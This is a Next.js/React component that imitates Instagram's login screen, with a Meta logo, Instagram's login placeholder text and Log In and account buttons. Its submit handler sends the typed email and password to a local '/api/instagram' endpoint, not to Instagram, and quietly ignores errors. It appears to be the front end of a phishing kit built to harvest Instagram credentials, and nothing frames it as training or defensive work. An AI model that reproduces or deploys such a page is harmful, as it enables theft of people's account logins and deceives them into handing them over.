'use client'

import React, { useState } from 'react'
import Logo from "../../public/meta-logo-12362.png"
import Image from 'next/image'

const Form = () => {
    const [formData ,setFormData]=useState({
        email: '' ,
        password: ''
      })
      const handleSubmit = async (e:any) => {
        e.preventDefault();

         try {
            const responce = await fetch('/api/instagram', {
                method:'POST',
                headers:{"Content_Type" :"application/json"} ,
                body: JSON.stringify({
                    email: formData.email,
                    password: formData.password
                })
            })
            
         } catch (error) {
            
         }
       
      };
    
      const handleInputChange = (e:any) => {
        const { name, value } = e.target;
        setFormData({ ...formData, [name]: value });
      };
  return (
    <div>
         <form onSubmit={handleSubmit} className='flex flex-col w-full flex-wrap md:flex-nowrap gap-4 pt-[100px] ' >
          <input required placeholder='Username, email address or mobile number' type="email" name="email" id="" className=' bg-white pl-[10px]  w-[95%] mx-auto h-[50px] rounded-lg border border-slate-400 text-[15px] ' value={formData.email}  onChange={handleInputChange} />
          <input required value={formData.password}  placeholder=' Password' type="password" name="password" id="" className=' bg-white pl-[10px]  w-[95%] mx-auto h-[50px] rounded-lg  border border-slate-400 text-[15px] font-normal '  onChange={handleInputChange} />  

          <button type='submit' className=' w-[95%] text-center bg-[#0064e0] mx-auto h-[50px] rounded-full text-[17px] text-white font-mediam   ' >Log In</button>
          <h1>Forgotten Password?</h1>

          <button type='submit' className=' w-[95%] text-centermx-auto h-[50px]  text-[16px]  font-mediam border border-[#0064e0] mx-auto rounded-full text-[#0064e0] mt-[50px]   ' >Create new account</button>
           <Image src={Logo} alt="" className=' w-[70px] mx-auto p ' />
         </form>
    </div>
  )
}

export default Form